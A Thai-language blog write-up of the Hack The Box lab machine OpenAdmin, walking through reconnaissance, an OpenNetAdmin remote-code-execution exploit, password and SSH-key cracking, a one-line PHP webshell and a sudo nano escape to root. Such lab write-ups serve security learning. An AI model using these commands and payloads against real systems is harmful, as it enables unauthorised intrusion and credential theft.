<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[Writeup] Hack The Box: OpenAdmin (Thai Version) | ErbaZZ's Space</title><meta name=keywords content="writeup,walkthrough,htb,hackthebox,th,ภาษาไทย"><meta name=description content="สำหรับวันนี้ เรามาลองดูเครื่องที่ชื่อว่า OpenAdmin ใน Hack The Box กันนะครับ เครื่องนี้เป็นเครื่องระดับง่าย ที่มือใหม่ก็น่าจะพอเล่นกันผ่านได้โดยไม่ยากครับ

"><meta name=author content="ErbaZZ"><link rel=canonical href=https://erbazz.me/writeup/htb_openadmin_th/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://erbazz.me/favicon.ico><link rel=apple-touch-icon href=https://erbazz.me/favicon.ico><link rel=mask-icon href=https://erbazz.me/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="[Writeup] Hack The Box: OpenAdmin (Thai Version)"><meta property="og:description" content="สำหรับวันนี้ เรามาลองดูเครื่องที่ชื่อว่า OpenAdmin ใน Hack The Box กันนะครับ เครื่องนี้เป็นเครื่องระดับง่าย ที่มือใหม่ก็น่าจะพอเล่นกันผ่านได้โดยไม่ยากครับ

"><meta property="og:type" content="article"><meta property="og:url" content="https://erbazz.me/writeup/htb_openadmin_th/"><meta property="og:image" content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="writeup"><meta property="article:published_time" content="2020-04-29T23:39:11+07:00"><meta property="article:modified_time" content="2020-04-29T23:39:11+07:00"><meta property="og:site_name" content="ErbaZZ's Space"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[Writeup] Hack The Box: OpenAdmin (Thai Version)"><meta name=twitter:description content="สำหรับวันนี้ เรามาลองดูเครื่องที่ชื่อว่า OpenAdmin ใน Hack The Box กันนะครับ เครื่องนี้เป็นเครื่องระดับง่าย ที่มือใหม่ก็น่าจะพอเล่นกันผ่านได้โดยไม่ยากครับ

"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://erbazz.me/writeup/"},{"@type":"ListItem","position":2,"name":"[Writeup] Hack The Box: OpenAdmin (Thai Version)","item":"https://erbazz.me/writeup/htb_openadmin_th/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[Writeup] Hack The Box: OpenAdmin (Thai Version)","name":"[Writeup] Hack The Box: OpenAdmin (Thai Version)","description":"สำหรับวันนี้ เรามาลองดูเครื่องที่ชื่อว่า OpenAdmin ใน Hack The Box กันนะครับ เครื่องนี้เป็นเครื่องระดับง่าย ที่มือใหม่ก็น่าจะพอเล่นกันผ่านได้โดยไม่ยากครับ\n","keywords":["writeup","walkthrough","htb","hackthebox","th","ภาษาไทย"],"articleBody":"สำหรับวันนี้ เรามาลองดูเครื่องที่ชื่อว่า OpenAdmin ใน Hack The Box กันนะครับ เครื่องนี้เป็นเครื่องระดับง่าย ที่มือใหม่ก็น่าจะพอเล่นกันผ่านได้โดยไม่ยากครับ\nOS: Linux\nDifficulty: Easy\nPoints: 20\nRelease: 04 Jan 2020\nIP: 10.10.10.171\nDate Cleared: 20 Apr 2020\nClick here to read the English version of this writeup\nInformation Gathering เริ่มต้นด้วยการ nmap เพื่อดูว่ามี port ไหนเปิดอยู่บ้าง จะเห็นว่ามี ssh เปิดอยู่ที่ port 22 และ http ที่ port 80\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 80 เมื่อเข้ามาที่ port 80 ด้วย web browser เราจะเจอกับหน้า Apache2 Default Page อยู่ที่หน้าแรก\nเราสามารถใช้ gobuster เพื่อทำ directory fuzzing หา path ที่ซ่อนอยู่ จะเห็นว่าเราเจอ path ที่เข้าถึงได้ 3 อันจาก wordlist big.txt\nลองเข้าไปดูแต่ละอัน ก็จะเจอกับหน้าเว็บที่เหมือนจะก็อปมาจาก template ดูไม่มีอะไรสำคัญเท่าไหร่\nแต่ในหน้า music เมื่อเราลองดูที่ปุ่ม Login จะเจอว่ามัน link ไปที่หน้า http://10.10.10.171/ona ที่มี OpenNetAdmin 18.1.1 อยู่\nพอลองเอาไปหาใน Google จะเห็นว่ามีช่องโหว่ RCE อยู่\nExploitation ลองโหลด exploit script จาก https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py มาบนเครื่อง แล้วรันด้วย python3 ona-rce.py exploit http://10.10.10.171/ona/ จะทำให้เราได้ reverse shell ของ user www-data\nเมื่อลองไล่ดูในไฟล์ของเว็บ จะเจอกับ config file นึง ที่มี database password n1nj4W4rri0R!\nจาก home directory เราจะ เห็น user อยู่ 2 account ได้แก่ jimmy และ joanna เมื่อลองเอา password ที่เจอก่อนหน้านี้มาใช้ จะพบว่า password นี้สามารถใช้ login เข้า user jimmy ได้\nพอเราได้ username และ password เราก็เปลี่ยนไปใช้ ssh เพื่อต่อไปยัง server ตรง ๆ ได้เลย ไม่ต้องผ่าน reverse shell\nพอลองไล่ดูไฟล์สักพัก ก็ไปเจอกับ directory นึงที่ชื่อว่า /var/www/internal ที่ jimmy เป็น owner\nลองอ่านไฟล์ดู จะเห็นว่าหน้า index.php จะมี login form อยู่ โดย username ต้องเป็น jimmy และ sha512 hash ของ password ต้องตรงกับที่ระบุไว้\nหน้า main.php จะมีการอ่านไฟล์ ssh private key ของ joanna\nพอเห็นแบบนี้ ก็พอจะเดาได้ว่าเราต้องหา password ที่ถูกต้องเพื่อ login เข้าไปในหน้า main.php แล้วเอา private key ของ joanna ออกมา แล้วใช้ key นั้นในการ ssh เข้าเป็น joanna\nเริ่มต้นจาก password ลองใช้เว็บ https://crackstation.net/ เพื่อ crack hash ที่ได้มา โชคดีที่ password เป็นคำง่าย ๆ ที่มีอยู่ใน wordlist ที่เว็บนี้ใช้ เลย crack ออกมาได้\nได้ password เป็นคำว่า Revealed\nเราต้องรู้ก่อนว่าหน้าเว็บนี้ host อยู่บน port อะไร จากในตอนแรกจะเห็นว่า web server เป็น Apache สามารถไปดู config file ได้ใน /etc/apache2/ จะเจอว่า /var/www/internal ถูก host อยู่บน port 52846\n….เอ้า? ไหนตอนแรกบอก nmap มาเจอแค่ 22 กับ 80 ไง?\nก็ใช่น่ะสิครับ เว็บมันเปิด listen อยู่แค่บนเครื่องตัวเองเป็น internal ไม่ได้เปิดให้ข้างนอกเข้าถึงได้\nแต่ว่า!!! ถ้าเรามาอ่าน code ของไฟล์ main.php ใหม่ดี ๆ\nphp session_start(); if (!isset ($_SESSION['username'])) { header(\"Location: /index.php\"); }; # Open Admin Trusted # OpenAdmin $output = shell_exec('cat /home/joanna/.ssh/id_rsa'); echo \"$output\"; ? Don't forget your \"ninja\" password Click here to logout Session  จะเห็นว่า ไม่ว่าเราจะ login หรือไม่ก็ตาม private key ก็จะถูก output มาอยู่ดี แค่ถ้าไม่ได้ login ก็จะมีการ redirect กลับไป index.php\nดังนั้น เราสามารถใช้ curl เพื่อเข้าถึงหน้าเว็บนั้นตรง ๆ จากบนเครื่องเป้าหมายได้เลย\nอ่าว แล้วแบบนี้ ถ้าเราอยากเข้าไปดูหน้าเว็บสวย ๆ ด้วย web browser ของเรา อยากลองกรอกฟอร์ม login ดี ๆ ไม่อยากจ้องแต่ code ของหน้าเว็บ จะทำยังไงดีล่ะ?\nในเมื่อเรารู้ username และ password ของ jimmy เราสามารถใช้ ssh เพื่อทำ Local Port Forwarding จาก port นึงบนเครื่องเรา ไปยังปลายทางผ่านเครื่องที่เรา ssh ไปหาได้\nโดย command ในการทำ Local Port Forwarding คือ ssh -L local_port:destination_ip:destination_port username@ssh_server_ip\nซึ่งในกรณีนี้ สมมุติว่าเราอยาก forward จาก port 80 บนเครื่องเรา (local_port) ผ่านเครื่องที่เรา ssh ไปหาซึ่งก็คือ 10.10.10.171 (ssh_server_ip) จากนั้นให้เครื่องนั้น forward ต่อไปที่เครื่องนั้นเอง 127.0.0.1 (destination_ip) ที่ port 52846 (destination_port) โดยใช้ user jimmy (username)\nดังนั้นเราต้องใช้ command ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171\nจากนั้น เราจะสามารถใช้ web browser บนเครื่องเรา เข้าไปที่ port 80 บนเครื่องเราเอง ตัว request จะถูก forward ไปที่เว็บปลายทาง ทำให้เราสามารถเข้าถึงหน้าเว็บได้\nลอง login ด้วย jimmy:Revealed\nวิธีนี้ ทำให้เราเข้าถึง private key ของ joanna ได้ผ่าน web browser\nพอได้ key มาแล้ว ให้เรา copy มาไว้ในไฟล์บนเครื่องเราได้เลย โดยเราตั้งชื่อว่า privkey จากนั้นเราสามารถใช้ key เพื่อ ssh ไปยังเครื่องเป้าหมายด้วย user joanna ด้วย command ssh -i privkey joanna@10.10.10.171 ได้เลย… รึเปล่า?\nยัง! ต้องมี passphrase สำหรับใช้ key อีก!\nแล้วเราจะหา passphrase มาจากไหนล่ะ? มาลอง crack ด้วย rockyou.txt โดยใช้ john\nเราสามารถแปลง private key ให้อยู่ใน format ที่ john สามารถ crack ได้ด้วย command python /usr/share/jogn/ssh2john.py privkey  privkey.hash จากนั้นเริ่ม crack ด้วย command john privkey.hash --wordlist=/usr/share/wordlists/rockyou.txt\nและแล้วเราก็ได้ passphrase!\nในที่สุด เราก็จะ ssh ไปที่เครื่องปลายทางได้ด้วย private key ที่ได้มา และใช้ passphrase เป็น bloodninjas\nAnother Solution มีอีกวิธีที่เราใช้ในการเข้าถึง joanna ได้ ถ้ากลับไปดู เราจะเห็นว่า jimmy เป็น owner ของ directory /var/www/internal เท่ากับว่าเราสามารถเขียนไฟล์ หรือแก้ไฟล์ในนี้ได้เลย\nเราสามารถเขียน PHP webshell ง่าย ๆ ไว้ในนั้น โดยใช้ command echo ''  cmd.php จากนั้นเราก็ใช้ curl เพื่อรัน command ด้วยสิทธิ์ของ joanna ได้เลย โดยใช้ command curl localhost:52846/cmd.php?cmd=[COMMAND]\nเราอาจใช้วิธีนี้ในการดึง private key ออกมา หรือเอา public key ของเครื่องเราไปใส่ไว้ใน /home/joanna/.ssh/authorized_keys ก็ได้\nPrivilege Escalation การ escalate บนเครื่องนี้ค่อนข้างจะตรงไปตรงมา ลองใช้ sudo -l จะเห็นว่าเรารัน nano ด้วยสิทธิ์ root ได้โดยไม่ต้องใช้ password\nจากเว็บ https://gtfobins.github.io/gtfobins/nano/ เราจะเห็นว่าเราสามารถใช้ sudo กับ nano เพื่อ escalate เป็น root ได้เลย\nลองรัน nano ด้วย sudo\nกด Ctrl-R แล้วกด Ctrl-X\nพิมพ์ reset; sh 1\u00260 2\u00260 จากนั้นกด Enter\nกด Enter สักสองสามทีเพื่อเคลียร์จอ จะเห็นว่าเราได้ยกสิทธิ์ตัวเองเป็น root เรียบร้อย\n","wordCount":"655","inLanguage":"en","datePublished":"2020-04-29T23:39:11+07:00","dateModified":"2020-04-29T23:39:11+07:00","author":{"@type":"Person","name":"ErbaZZ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://erbazz.me/writeup/htb_openadmin_th/"},"publisher":{"@type":"Organization","name":"ErbaZZ's Space","logo":{"@type":"ImageObject","url":"https://erbazz.me/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://erbazz.me/ accesskey=h title="ErbaZZ's Space (Alt + H)"><img src=https://erbazz.me/apple-touch-icon.png alt aria-label=logo height=35>ErbaZZ's Space</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://erbazz.me/ title=Home><span>Home</span></a></li><li><a href=https://erbazz.me/writeup/ title=Writeup><span>Writeup</span></a></li><li><a href=https://erbazz.me/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://erbazz.me/>Home</a>&nbsp;»&nbsp;<a href=https://erbazz.me/writeup/>Writeups</a></div><h1 class=post-title>[Writeup] Hack The Box: OpenAdmin (Thai Version)</h1><div class=post-meta><span title="2020-04-29 23:39:11 +0700 +07">April 29, 2020</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;655 words&nbsp;·&nbsp;ErbaZZ</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#information-gathering>Information Gathering</a><ul><li><a href=#port-80>Port 80</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#another-solution>Another Solution</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></details></div><div class=post-content><p>สำหรับวันนี้ เรามาลองดูเครื่องที่ชื่อว่า OpenAdmin ใน Hack The Box กันนะครับ เครื่องนี้เป็นเครื่องระดับง่าย ที่มือใหม่ก็น่าจะพอเล่นกันผ่านได้โดยไม่ยากครับ</p><p><img loading=lazy src=/images/htb_openadmin/infocard.png alt></p><p><strong>OS:</strong> Linux<br><strong>Difficulty:</strong> Easy<br><strong>Points:</strong> 20<br><strong>Release:</strong> 04 Jan 2020<br><strong>IP:</strong> 10.10.10.171<br><strong>Date Cleared:</strong> 20 Apr 2020</p><p><strong><a href=/writeup/htb_openadmin/>Click here to read the English version of this writeup</a></strong></p><h2 id=information-gathering>Information Gathering<a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><p>เริ่มต้นด้วยการ <code>nmap</code> เพื่อดูว่ามี port ไหนเปิดอยู่บ้าง จะเห็นว่ามี <code>ssh</code> เปิดอยู่ที่ port 22 และ <code>http</code> ที่ port <code>80</code></p><pre tabindex=0><code>PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h3 id=port-80>Port 80<a hidden class=anchor aria-hidden=true href=#port-80>#</a></h3><p>เมื่อเข้ามาที่ port <code>80</code> ด้วย web browser เราจะเจอกับหน้า Apache2 Default Page อยู่ที่หน้าแรก</p><p><img loading=lazy src=/images/htb_openadmin/80_home.png alt></p><p>เราสามารถใช้ <code>gobuster</code> เพื่อทำ directory fuzzing หา path ที่ซ่อนอยู่ จะเห็นว่าเราเจอ path ที่เข้าถึงได้ 3 อันจาก wordlist <code>big.txt</code></p><p><img loading=lazy src=/images/htb_openadmin/80_gobuster.png alt></p><p>ลองเข้าไปดูแต่ละอัน ก็จะเจอกับหน้าเว็บที่เหมือนจะก็อปมาจาก template ดูไม่มีอะไรสำคัญเท่าไหร่</p><p><img loading=lazy src=/images/htb_openadmin/80_artwork.png alt></p><p><img loading=lazy src=/images/htb_openadmin/80_sierra.png alt></p><p><img loading=lazy src=/images/htb_openadmin/80_music.png alt></p><p>แต่ในหน้า music เมื่อเราลองดูที่ปุ่ม Login จะเจอว่ามัน link ไปที่หน้า <a href=http://10.10.10.171/ona>http://10.10.10.171/ona</a> ที่มี <code>OpenNetAdmin 18.1.1</code> อยู่</p><p><img loading=lazy src=/images/htb_openadmin/80_ona.png alt></p><p>พอลองเอาไปหาใน Google จะเห็นว่ามีช่องโหว่ RCE อยู่</p><p><img loading=lazy src=/images/htb_openadmin/ona_rce.png alt></p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>ลองโหลด exploit script จาก <a href=https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py>https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py</a> มาบนเครื่อง แล้วรันด้วย <code>python3 ona-rce.py exploit http://10.10.10.171/ona/</code> จะทำให้เราได้ reverse shell ของ user <code>www-data</code></p><p><img loading=lazy src=/images/htb_openadmin/80_ona_rev.png alt></p><p>เมื่อลองไล่ดูในไฟล์ของเว็บ จะเจอกับ config file นึง ที่มี database password <code>n1nj4W4rri0R!</code></p><p><img loading=lazy src=/images/htb_openadmin/dbsetting.png alt></p><p>จาก home directory เราจะ เห็น user อยู่ 2 account ได้แก่ <code>jimmy</code> และ <code>joanna</code> เมื่อลองเอา password ที่เจอก่อนหน้านี้มาใช้ จะพบว่า password นี้สามารถใช้ login เข้า user <code>jimmy</code> ได้</p><p><img loading=lazy src=/images/htb_openadmin/user.png alt></p><p>พอเราได้ username และ password เราก็เปลี่ยนไปใช้ <code>ssh</code> เพื่อต่อไปยัง server ตรง ๆ ได้เลย ไม่ต้องผ่าน reverse shell</p><p>พอลองไล่ดูไฟล์สักพัก ก็ไปเจอกับ directory นึงที่ชื่อว่า <code>/var/www/internal</code> ที่ <code>jimmy</code> เป็น owner</p><p><img loading=lazy src=/images/htb_openadmin/internal.png alt></p><p>ลองอ่านไฟล์ดู จะเห็นว่าหน้า <code>index.php</code> จะมี login form อยู่ โดย username ต้องเป็น <code>jimmy</code> และ <code>sha512</code> hash ของ password ต้องตรงกับที่ระบุไว้</p><p><img loading=lazy src=/images/htb_openadmin/internal_index.png alt></p><p>หน้า <code>main.php</code> จะมีการอ่านไฟล์ ssh private key ของ <code>joanna</code></p><p><img loading=lazy src=/images/htb_openadmin/internal_main.png alt></p><p>พอเห็นแบบนี้ ก็พอจะเดาได้ว่าเราต้องหา password ที่ถูกต้องเพื่อ login เข้าไปในหน้า <code>main.php</code> แล้วเอา private key ของ <code>joanna</code> ออกมา แล้วใช้ key นั้นในการ <code>ssh</code> เข้าเป็น <code>joanna</code></p><p>เริ่มต้นจาก password ลองใช้เว็บ <a href=https://crackstation.net/>https://crackstation.net/</a> เพื่อ crack hash ที่ได้มา โชคดีที่ password เป็นคำง่าย ๆ ที่มีอยู่ใน wordlist ที่เว็บนี้ใช้ เลย crack ออกมาได้</p><p>ได้ password เป็นคำว่า <code>Revealed</code></p><p><img loading=lazy src=/images/htb_openadmin/internal_index_crack.png alt></p><p>เราต้องรู้ก่อนว่าหน้าเว็บนี้ host อยู่บน port อะไร จากในตอนแรกจะเห็นว่า web server เป็น <code>Apache</code> สามารถไปดู config file ได้ใน <code>/etc/apache2/</code> จะเจอว่า <code>/var/www/internal</code> ถูก host อยู่บน port <code>52846</code></p><p><img loading=lazy src=/images/htb_openadmin/internal_apache.png alt></p><p>&mldr;.เอ้า? ไหนตอนแรกบอก <code>nmap</code> มาเจอแค่ <code>22</code> กับ <code>80</code> ไง?</p><p>ก็ใช่น่ะสิครับ เว็บมันเปิด listen อยู่แค่บนเครื่องตัวเองเป็น internal ไม่ได้เปิดให้ข้างนอกเข้าถึงได้</p><p><strong>แต่ว่า!!!</strong> ถ้าเรามาอ่าน code ของไฟล์ <code>main.php</code> ใหม่ดี ๆ</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>session_start</span><span class=p>();</span> <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span> <span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]))</span> <span class=p>{</span> <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: /index.php&#34;</span><span class=p>);</span> <span class=p>};</span> 
</span></span><span class=line><span class=cl><span class=c1># Open Admin Trusted
</span></span></span><span class=line><span class=cl><span class=c1># OpenAdmin
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$output</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>$output</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt;
</span></span></span><span class=line><span class=cl><span class=err>Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session
</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
</span></span></span></code></pre></div><p>จะเห็นว่า ไม่ว่าเราจะ login หรือไม่ก็ตาม private key ก็จะถูก output มาอยู่ดี แค่ถ้าไม่ได้ login ก็จะมีการ redirect กลับไป <code>index.php</code></p><p>ดังนั้น เราสามารถใช้ <code>curl</code> เพื่อเข้าถึงหน้าเว็บนั้นตรง ๆ จากบนเครื่องเป้าหมายได้เลย</p><p><img loading=lazy src=/images/htb_openadmin/internal_curlpriv.png alt></p><p>อ่าว แล้วแบบนี้ ถ้าเราอยากเข้าไปดูหน้าเว็บสวย ๆ ด้วย web browser ของเรา อยากลองกรอกฟอร์ม login ดี ๆ ไม่อยากจ้องแต่ code ของหน้าเว็บ จะทำยังไงดีล่ะ?</p><p>ในเมื่อเรารู้ username และ password ของ <code>jimmy</code> เราสามารถใช้ <code>ssh</code> เพื่อทำ <code>Local Port Forwarding</code> จาก port นึงบนเครื่องเรา ไปยังปลายทางผ่านเครื่องที่เรา <code>ssh</code> ไปหาได้</p><p>โดย command ในการทำ <code>Local Port Forwarding</code> คือ <code>ssh -L local_port:destination_ip:destination_port username@ssh_server_ip</code></p><p>ซึ่งในกรณีนี้ สมมุติว่าเราอยาก forward จาก port <code>80</code> บนเครื่องเรา (local_port) ผ่านเครื่องที่เรา <code>ssh</code> ไปหาซึ่งก็คือ <code>10.10.10.171</code> (ssh_server_ip) จากนั้นให้เครื่องนั้น forward ต่อไปที่เครื่องนั้นเอง <code>127.0.0.1</code> (destination_ip) ที่ port <code>52846</code> (destination_port) โดยใช้ user <code>jimmy</code> (username)</p><p>ดังนั้นเราต้องใช้ command <code>ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171</code></p><p><img loading=lazy src=/images/htb_openadmin/internal_localforward.png alt></p><p>จากนั้น เราจะสามารถใช้ web browser บนเครื่องเรา เข้าไปที่ port <code>80</code> บนเครื่องเราเอง ตัว request จะถูก forward ไปที่เว็บปลายทาง ทำให้เราสามารถเข้าถึงหน้าเว็บได้</p><p><img loading=lazy src=/images/htb_openadmin/internal_localhost.png alt></p><p>ลอง login ด้วย <code>jimmy:Revealed</code></p><p><img loading=lazy src=/images/htb_openadmin/internal_login.png alt></p><p>วิธีนี้ ทำให้เราเข้าถึง private key ของ <code>joanna</code> ได้ผ่าน web browser</p><p><img loading=lazy src=/images/htb_openadmin/internal_privkey.png alt></p><p>พอได้ key มาแล้ว ให้เรา copy มาไว้ในไฟล์บนเครื่องเราได้เลย โดยเราตั้งชื่อว่า <code>privkey</code> จากนั้นเราสามารถใช้ key เพื่อ <code>ssh</code> ไปยังเครื่องเป้าหมายด้วย user <code>joanna</code> ด้วย command <code>ssh -i privkey joanna@10.10.10.171</code> ได้เลย&mldr; รึเปล่า?</p><p><strong>ยัง! ต้องมี passphrase สำหรับใช้ key อีก!</strong></p><p><img loading=lazy src=/images/htb_openadmin/joanna_pass.png alt></p><p>แล้วเราจะหา passphrase มาจากไหนล่ะ? มาลอง crack ด้วย <code>rockyou.txt</code> โดยใช้ <code>john</code></p><p>เราสามารถแปลง private key ให้อยู่ใน format ที่ <code>john</code> สามารถ crack ได้ด้วย command <code>python /usr/share/jogn/ssh2john.py privkey > privkey.hash</code> จากนั้นเริ่ม crack ด้วย command <code>john privkey.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><strong>และแล้วเราก็ได้ passphrase!</strong></p><p><img loading=lazy src=/images/htb_openadmin/internal_privkey_crack.png alt></p><p>ในที่สุด เราก็จะ <code>ssh</code> ไปที่เครื่องปลายทางได้ด้วย private key ที่ได้มา และใช้ passphrase เป็น <code>bloodninjas</code></p><p><img loading=lazy src=/images/htb_openadmin/joanna_ssh.png alt></p><h3 id=another-solution>Another Solution<a hidden class=anchor aria-hidden=true href=#another-solution>#</a></h3><p>มีอีกวิธีที่เราใช้ในการเข้าถึง <code>joanna</code> ได้ ถ้ากลับไปดู เราจะเห็นว่า <code>jimmy</code> เป็น owner ของ directory <code>/var/www/internal</code> เท่ากับว่าเราสามารถเขียนไฟล์ หรือแก้ไฟล์ในนี้ได้เลย</p><p><img loading=lazy src=/images/htb_openadmin/internal.png alt></p><p>เราสามารถเขียน PHP webshell ง่าย ๆ ไว้ในนั้น โดยใช้ command <code>echo '&lt;?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php</code> จากนั้นเราก็ใช้ <code>curl</code> เพื่อรัน command ด้วยสิทธิ์ของ <code>joanna</code> ได้เลย โดยใช้ command <code>curl localhost:52846/cmd.php?cmd=[COMMAND]</code></p><p><img loading=lazy src=/images/htb_openadmin/internal_joannacmd.png alt></p><p>เราอาจใช้วิธีนี้ในการดึง private key ออกมา หรือเอา public key ของเครื่องเราไปใส่ไว้ใน <code>/home/joanna/.ssh/authorized_keys</code> ก็ได้</p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>การ escalate บนเครื่องนี้ค่อนข้างจะตรงไปตรงมา ลองใช้ <code>sudo -l</code> จะเห็นว่าเรารัน <code>nano</code> ด้วยสิทธิ์ <code>root</code> ได้โดยไม่ต้องใช้ password</p><p><img loading=lazy src=/images/htb_openadmin/joanna_nano.png alt></p><p>จากเว็บ <a href=https://gtfobins.github.io/gtfobins/nano/>https://gtfobins.github.io/gtfobins/nano/</a> เราจะเห็นว่าเราสามารถใช้ <code>sudo</code> กับ <code>nano</code> เพื่อ escalate เป็น <code>root</code> ได้เลย</p><p><img loading=lazy src=/images/htb_openadmin/gtfobins.png alt></p><p>ลองรัน <code>nano</code> ด้วย <code>sudo</code></p><p><img loading=lazy src=/images/htb_openadmin/priv1.png alt></p><p>กด <code>Ctrl-R</code> แล้วกด <code>Ctrl-X</code></p><p><img loading=lazy src=/images/htb_openadmin/priv2.png alt></p><p>พิมพ์ <code>reset; sh 1>&0 2>&0</code> จากนั้นกด <code>Enter</code></p><p><img loading=lazy src=/images/htb_openadmin/priv3.png alt></p><p>กด <code>Enter</code> สักสองสามทีเพื่อเคลียร์จอ 